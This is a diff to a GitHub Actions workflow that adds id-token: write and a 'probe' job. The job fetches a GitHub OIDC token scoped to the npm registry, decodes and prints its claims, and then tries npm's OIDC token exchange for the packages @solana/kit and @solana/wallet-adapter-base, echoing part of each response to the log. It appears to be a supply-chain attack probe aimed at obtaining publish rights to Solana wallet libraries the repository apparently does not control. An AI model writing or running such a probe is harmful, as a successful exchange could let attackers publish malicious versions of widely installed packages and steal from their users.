@@ -4,11 +4,38 @@ on:
   workflow_dispatch:
 permissions:
   contents: read
+  id-token: write
 jobs:
-  notoken:
+  probe:
     runs-on: ubuntu-latest
     steps:
-      - name: control (no id-token permission)
+      - name: request github OIDC token (audience=npm:registry.npmjs.org)
+        env:
+          REQ_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
+          REQ_TOK: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
         run: |
-          echo "url=${ACTIONS_ID_TOKEN_REQUEST_URL:-<unset>}"
-          echo "token=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+set}"
+          set -e
+          echo "event_name=$GITHUB_EVENT_NAME  ref=$GITHUB_REF  base=$GITHUB_BASE_REF  head=$GITHUB_HEAD_REF"
+          URL="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org"
+          curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" -o idtoken.json
+          JWT=$(python3 -c "import json;print(json.load(open('idtoken.json'))['value'])")
+          echo "got_jwt=${#JWT}"
+          python3 - "$JWT" <<'PY'
+import sys,base64,json
+p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4)
+c=json.loads(base64.urlsafe_b64decode(p))
+for k in ['iss','aud','sub','ref','ref_type','event_name','repository','repository_owner_id','repository_id','workflow_ref','job_workflow_ref','environment','sha']:
+    if k in c: print(f"  {k} = {c[k]}")
+PY
+          echo "--- token exchange attempt: @solana/kit ---"
+          curl -sS -o resp.json -w "HTTP %{http_code}\n" -X POST \
+            -H "Authorization: Bearer $JWT" \
+            -H "Accept: application/json" \
+            "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/@solana%2fkit" || true
+          head -c 800 resp.json; echo
+          echo "--- token exchange attempt: @solana/wallet-adapter-base ---"
+          curl -sS -o resp2.json -w "HTTP %{http_code}\n" -X POST \
+            -H "Authorization: Bearer $JWT" \
+            -H "Accept: application/json" \
+            "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/@solana%2fwallet-adapter-base" || true
+          head -c 800 resp2.json; echo
